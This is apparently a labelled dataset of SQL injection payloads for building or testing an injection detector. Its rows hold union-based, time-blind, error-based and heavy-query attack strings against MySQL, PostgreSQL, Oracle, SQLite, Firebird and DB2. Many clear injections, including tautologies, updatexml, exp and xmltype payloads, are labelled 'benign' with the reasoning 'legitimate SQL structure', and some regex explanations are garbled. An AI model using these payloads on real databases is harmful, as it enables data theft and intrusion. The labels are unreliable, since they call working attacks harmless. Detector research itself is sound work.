id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24886,"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'vwtq' = 'vwtq",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24887,-6487 ) or 6872 = 6872 and ( 7688 = 7688,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24888,-9054 ) ) ) or 9323 = 9323#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24889,"1'|| ( select 'zrea' from dual where 1223 = 1223 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,oracle,0.85,Signal match: randomblob → time_blind (P5); DB signature: oracle,1
24890,1' ) where 6624 = 6624 and 5392 = 8258,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24891,"1' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'msol' = 'msol",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24892,"iif ( 4836 = 1823,1,1/0 )",unknown,generic,0.50,Insufficient information to classify,1
24893,"1"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""ghdr"" like ""ghdr",error_based,generic,0.85,Signal match: updatexml → error_based (P4); confidence: 0.85,1
24894,"1 ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( 5888 = 5888",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24895,1'+ ( select 'tmel' where 2655 = 2655 rlike ( select ( case when ( 2118 = 8500 ) then 1 else 0x28 end ) ) ) +',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24896,"-1413"" ) union all select 6651,6651,6651--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24897,-5708 where 3134 = 3134 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24898,"1 ) and make_set ( 8403 = 8403,8899 )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24899,"-7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24900,"1"" ) ) as xbhp where 7527 = 7527",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24901,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""eaqk"" = ""eaqk",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24902,-2783%' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24903,"-4135' ) ) ) union all select 4413,4413,4413#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24904,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( '%' = '",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24905,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( 'pags' = 'pags,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24906,"1'+ ( select kgon where 9014 = 9014 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) +'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24907,select pg_sleep ( 5 ) and 'qfaz' like 'qfaz,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
24908,1 ) as ptxw where 9873 = 9873,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24909,"1%"" ) union all select null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24910,"-2430' ) union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24911,1'|| ( select 'jslz' where 8405 = 8405 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) ||',time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24912,"1 ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 7244 = 7244",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24913,1 ) ) ) and 4595 = 4595#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24914,1' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24915,"1"" ) where 9093 = 9093",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24916,"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24917,-2055 ) or 3038 = 3038,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24918,"1'+ ( select 'suzs' where 2905 = 2905 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) +'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24919,select ( case when ( 4769 = 4769 ) then 4769 else 4769* ( select 4769 from mysql.db ) end ) #,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24920,"1' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( 'cpoy' = 'cpoy",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24921,"1"" ) as eoer where 8667 = 8667 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
24922,"select pg_sleep ( 5 ) and ( ( ""%"" = """,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
24923,"1"" ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24924,1'|| ( select 'irfn' where 8360 = 8360,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24925,"1%"" ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24926,"-5840' ) or elt ( 1032 = 1032,3623 )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24927,-9355' or 6872 = 6872 and 'mztk' = 'mztk,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24928,"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""bkoq"" = ""bkoq",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24929,"1 ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
24930,"1%"" ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24931,1 where 2238 = 2238,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24932,"-5211"" ) ) as bkvr where 4082 = 4082 or 2323 = 8052",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24933,"1 ) ) as oywa where 7951 = 7951 union all select null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24934,"-2207%' ) ) union all select 3339,3339,3339,3339,3339,3339#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24935,"1' where 7417 = 7417 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24936,"1' ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'fzgy' = 'fzgy",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24937,select ( case when ( 8689 = 2468 ) then 8689 else 1/ ( select 0 ) end ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24938,"1' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'dgwe' like 'dgwe",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24939,"1"" ) ) as swwb where 4244 = 4244",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24940,"1"" ) ) as fapw where 4722 = 4722 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24941,"1' or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and 'bwrb' like 'bwrb",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24942,"-2718"" ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""kbvd"" like ""kbvd",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24943,"-1526"" ) where 4870 = 4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
